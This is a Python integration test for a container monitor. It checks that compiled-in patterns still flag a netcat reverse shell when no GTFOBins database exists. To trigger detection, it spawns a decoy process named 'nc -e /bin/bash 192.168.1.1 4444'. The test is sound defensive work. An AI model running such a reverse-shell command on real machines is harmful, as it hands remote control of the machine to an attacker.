"""
Integration test: compiled-in exec patterns still fire when no GTFOBins clone exists.

Counterpart to test_gtfobins_db_pattern_detection: verifies that the absence of
~/.coi/gtfobins/ does not break detection — the compiled-in defaultExecPatterns in
internal/monitor/procwatcher.go are used as an automatic fallback.
"""

import hashlib
import json
import os
import subprocess
import time

import pytest


def _container_name(workspace):
    abs_path = os.path.abspath(workspace)
    h = hashlib.sha256(abs_path.encode()).hexdigest()[:8]
    return f"coi-{h}-1"


def _container_state(name):
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"
    containers = json.loads(result.stdout)
    return containers[0].get("status", "Unknown") if containers else "Unknown"


def _cleanup(name, coi_binary):
    subprocess.run([coi_binary, "container", "delete", name, "--force"], timeout=30, check=False)


def test_gtfobins_db_absent_compiled_in_patterns_still_fire(tmp_path, coi_binary):
    """
    With no GTFOBins clone the compiled-in nc-exec pattern still detects reverse shells.

    Flow:
    1. Create <tmp_home>/.coi/config.toml with monitoring enabled — no gtfobins dir
    2. Start coi shell with HOME=<tmp_home>
    3. Exec nc -e inside the container (matches compiled-in nc-exec pattern)
    4. Poll the audit log for a threat event referencing "nc-exec"
    """
    fake_home = tmp_path / "home"
    coi_dir = fake_home / ".coi"
    coi_dir.mkdir(parents=True)
    # Deliberately no .coi/gtfobins directory — daemon must fall back to defaults.

    (coi_dir / "config.toml").write_text(
        """
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000
"""
    )

    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "README.md").write_text("# Test")

    env = {**os.environ, "HOME": str(fake_home)}
    proc = subprocess.Popen(
        [coi_binary, "shell", "--workspace", str(workspace), "--slot", "1"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=env,
    )

    container_name = _container_name(str(workspace))
    ready = any(
        _container_state(container_name) == "Running" or time.sleep(1)  # type: ignore[func-returns-value]
        for _ in range(30)
    )
    if not ready:
        proc.terminate()
        pytest.skip(f"Container {container_name} did not reach Running state")

    # Matches compiled-in nc-exec pattern: Arg0="nc", Keywords=["-e"].
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    log_path = coi_dir / "audit" / f"{container_name}.jsonl"
    detected = False
    for _ in range(20):
        time.sleep(1)
        if log_path.exists():
            for raw in log_path.read_text().splitlines():
                if not raw.strip():
                    continue
                try:
                    ev = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                if "level" not in ev:
                    continue
                if "nc-exec" in ev.get("description", ""):
                    detected = True
                    break
        if detected:
            break

    proc.terminate()
    _cleanup(container_name, coi_binary)

    assert detected, (
        "No threat event referencing 'nc-exec' found in "
        f"{log_path} — compiled-in fallback patterns may be broken"
    )
